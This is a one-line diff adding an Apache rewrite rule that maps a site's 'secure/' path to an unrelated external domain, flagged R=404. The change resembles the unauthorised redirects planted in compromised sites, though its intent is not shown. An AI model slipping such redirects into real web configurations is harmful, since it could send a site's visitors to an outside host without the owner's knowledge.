@@ -1,0 +1,1 @@
+RewriteRule ^secure/ http://farhanlivetv.app.tc [R=404,L]
